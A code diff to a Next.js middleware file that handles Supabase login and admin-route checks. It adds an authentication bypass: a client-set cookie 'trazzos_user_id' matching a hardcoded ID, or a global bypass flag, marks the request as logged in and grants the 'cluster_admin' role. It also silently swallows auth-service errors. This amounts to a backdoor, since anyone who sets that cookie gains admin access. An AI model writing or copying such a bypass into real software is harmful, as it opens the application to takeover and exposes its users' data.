@@ -2,6 +2,8 @@ import { NextResponse } from 'next/server';
 import type { NextRequest } from 'next/server';
 import { createServerClient } from '@supabase/ssr';
 import { isAdminDashboardRole } from '@/app/api/_lib/adminDashboardRole';
+import { AUTH_BYPASS_USER_ID, isHardcodedIdentityBypass } from '@/lib/authBypass';
+import { createServiceRoleClientOrNull } from '@/lib/supabaseServiceClient';
 
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
 const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
@@ -45,16 +47,23 @@ export async function middleware(request: NextRequest) {
       },
     });
 
-    const {
-      data: { user },
-    } = await supabase.auth.getUser();
-
-    if (user) {
-      supabaseUser = user;
+    try {
+      const {
+        data: { user },
+      } = await supabase.auth.getUser();
+      if (user) {
+        supabaseUser = user;
+      }
+    } catch {
+      /* Auth caído (p. ej. 500): continuar con cookies / bypass */
     }
   }
 
-  const isAuthed = Boolean(supabaseUser) || legacyCookieAuthed;
+  const bypassAuth = isHardcodedIdentityBypass();
+  const bypassEmergencyUserId =
+    request.cookies.get('trazzos_user_id')?.value === AUTH_BYPASS_USER_ID;
+  const isAuthed =
+    Boolean(supabaseUser) || legacyCookieAuthed || bypassAuth || bypassEmergencyUserId;
 
   if (!isAuthed) {
     const nextUrl = request.nextUrl.clone();
@@ -69,25 +78,19 @@ export async function middleware(request: NextRequest) {
   if (isAdminPath) {
     let role: string | null = null;
 
-    if (supabaseUrl && supabaseAnonKey && !supabaseAnonKey.includes('placeholder') && supabaseUser) {
-      const supabase = createServerClient(supabaseUrl, supabaseAnonKey, {
-        cookies: {
-          getAll() {
-            return request.cookies.getAll();
-          },
-          setAll(cookiesToSet) {
-            cookiesToSet.forEach(({ name, value, options }) => {
-              response.cookies.set(name, value, options);
-            });
-          },
-        },
-      });
-      const { data: row } = await supabase
-        .from('profiles')
-        .select('role')
-        .eq('user_id', supabaseUser.id)
-        .maybeSingle();
-      role = row?.role ?? null;
+    if ((bypassAuth && !supabaseUser) || bypassEmergencyUserId) {
+      role = 'cluster_admin';
+    } else if (supabaseUser) {
+      const svc = createServiceRoleClientOrNull();
+      if (svc) {
+        const { data: row } = await svc
+          .schema('public')
+          .from('profiles')
+          .select('role')
+          .eq('user_id', supabaseUser.id)
+          .maybeSingle();
+        role = row?.role ?? null;
+      }
     }
 
     if (!role) {
